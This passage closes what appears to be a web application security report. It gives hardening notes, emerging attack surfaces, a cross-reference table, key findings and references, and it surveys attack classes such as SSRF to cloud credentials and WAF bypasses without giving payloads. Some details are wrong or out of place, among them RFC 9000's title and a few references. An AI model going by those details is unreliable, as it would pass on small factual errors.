- **Container images:** Distroless base images, no shell, multi-stage builds, SCA scanning
- **Pod security:** `SecurityContext` with `runAsNonRoot`, `readOnlyRootFilesystem`, `dropAllCapabilities`
- **Network policies:** Default deny, explicit allow for required communication
- **Secrets management:** Kubernetes Secrets → Vault/AWS Secrets Manager, never in environment variables or config files

---

## 13. Future Trends

### 13.1 WebAssembly (Wasm)

WebAssembly introduces a new runtime in the browser. While sandboxed, Wasm modules can:
- Access imported JavaScript functions via the `imports` object
- Share linear memory with JavaScript
- Contain vulnerabilities in the Wasm binary itself (buffer overflows in Wasm memory, integer overflows)

The Wasm attack surface is growing: Rust-to-Wasm toolchains reduce but do not eliminate bugs, and the Wasm runtime itself (V8's Liftoff/TurboFan compilation pipeline, documented in the [Chromium track](../Chromium_Architecture_and_Vulnerability/)) is a new trust boundary.

### 13.2 Supply Chain Attacks

npm, PyPI, and other package registries have been vectors for supply chain compromise (event-stream, ua-parser-js, colors.js, coa). Defense-in-depth includes:
- Lockfiles with integrity hashes (`package-lock.json`, `Pipfile.lock`)
- SCA scanning in CI/CD
- SRI for CDN-served resources
- Namespace verification (npm provenance, Sigstore)

### 13.3 AI/LLM-Generated Code

Large Language Models generate code that replicates known vulnerability patterns: SQL injection in string concatenation, XSS in template literals, hardcoded secrets, and insecure cryptographic defaults. The [cryptography track](../cryptography/) covers the specific cryptographic failure patterns that LLMs reproduce.

### 13.4 HTTP/3 (QUIC)

HTTP/3 uses QUIC (UDP-based, TLS 1.3 integrated). New attack surfaces:
- UDP amplification attacks (QUIC version negotiation)
- Connection ID routing discrepancies (similar to HTTP/2 multiplexing issues)
- 0-RTT replay attacks (TLS 1.3 early data)
- Load balancer QUIC parsing inconsistencies (potential new request smuggling vectors)

### 13.5 Post-Quantum Cryptography

NIST has finalized ML-KEM (CRYSTALS-Kyber) for key encapsulation and ML-DSA (CRYSTALS-Dilithium) for digital signatures. Web infrastructure will need to migrate TLS certificates and key exchange to post-quantum algorithms. The transition creates new attack surfaces: hybrid key exchange combines classical and PQ algorithms, and the PQ algorithms have larger key sizes and different failure modes (decryption failure in ML-KEM can leak information). The [cryptography track](../cryptography/) covers these transitions.

---

## 14. Cross-Track References

| Concept | This Track | Cross-Reference |
|---------|-----------|-----------------|
| Browser exploit chain | XSS → browser compromise | [Chromium](../Chromium_Architecture_and_Vulnerability/) — V8 exploitation, sandbox escapes |
| V8 type confusion → stored XSS | DOM XSS in renderer context | [Chromium](../Chromium_Architecture_and_Vulnerability/) — V8 Sandbox, renderer security |
| Zero-day discovery methodology | Fuzzing web parsers, diffing | [Zero-Day](../zero_day/) — Fuzzing, CodeQL, Semgrep, patch diffing |
| Cloud metadata SSRF | SSRF → AWS/GCP/Azure creds | [Cloud Security](../cloud_security/) — IAM, metadata, Kubernetes |
| Cryptographic failures | JWT, TLS, key management | [Cryptography](../cryptography/) — Algorithm attacks, key management, PQC |
| Supply chain compromise | npm/PyS/Docker image tampering | [Chromium](../Chromium_Architecture_and_Vulnerability/) — Dependency chain, Spectre |
| Kernel exploitation from web | Container escape → kernel | [Zero-Day](../zero_day/) — Kernel exploitation, LPE |

---

## Key Findings Summary

1. **Injection is eternal** — new abstractions re-introduce old injection surfaces (GraphQL, ORM raw queries, template engines)
2. **SSRF is the cloud-era RCE** — metadata endpoints transform SSRF from information disclosure to full account takeover
3. **Authentication is the primary pivot** — JWT confusion, OAuth bypass, and MFA fatigue are the most operationally relevant auth attacks
4. **API security is underaddressed** — BOLA, mass assignment, and excessive data exposure dominate API vulnerability findings
5. **Deserialization is lethal in enterprise** — Java gadget chains, PHP phar deserialization, and .NET ViewState remain critical
6. **Request smuggling exploits parser discrepancies** — every reverse proxy + backend combination is a potential surface
7. **WAF is a speed bump** — encoding, protocol-level, and parser-differential bypasses reliably defeat WAFs
8. **Exploitation chains define impact** — composing low-severity findings yields critical impact
9. **Client-side security depends on browser internals** — CSP, SOP, and Trusted Types are only as strong as the browser's enforcement
10. **The attack surface continues to expand** — Wasm, gRPC, HTTP/3, and LLM-generated code introduce new vulnerability classes faster than defensive frameworks adapt

---

*This report synthesizes the complete Web Application Security track. For deep technical detail on each vulnerability class, payload construction, and testing methodology, refer to the individual chapter documents in `docs/`. For cross-domain connections to browser exploitation, kernel attacks, cloud security, and cryptography, follow the cross-references above.*

---

## References

1. OWASP Foundation. "OWASP Top 10:2021." https://owasp.org/Top10/
2. OWASP Foundation. "OWASP API Security Top 10 (2023)." https://owasp.org/API-Security/
3. PortSwigger Ltd. "Web Security Academy." https://portswigger.net/web-security
4. Kettle, J. "HTTP Desync Attacks: Request Smuggling Reborn." PortSwigger Research, 2019. https://portswigger.net/research/http-desync-attacks
5. Orange Tsai. "A New Attack Surface on SSRF." Black Hat USA, 2019. https://blog.orange.tw/
6. MITRE Corporation. "CWE/SANS Top 25 Most Dangerous Software Weaknesses." https://cwe.mitre.org/top25/
7. OWASP Foundation. "OWASP Testing Guide v4." https://owasp.org/www-project-web-security-testing-guide/
8. RFC 9110-9114. "HTTP Core Specifications." IETF, 2022.
9. RFC 9000. "QUIC: A UDP-Based Multipath and Secure Transport." IETF, 2021.
10. NIST. "SP 800-63B: Digital Identity Guidelines." https://pages.nist.gov/800-63-3/sp800-63b.html
11. Statler, M. et al. "CVE-2019-11510: Pulse Secure VPN Exploit Analysis." Rapid7, 2019.
12. NSA Cybersecurity Advisory. "Mitigating Cloud Vulnerabilities." 2020. https://www.nsa.gov/Press-Room/Cyber-Advisories/
13. Which? "Smart Home Device Security Research." 2023.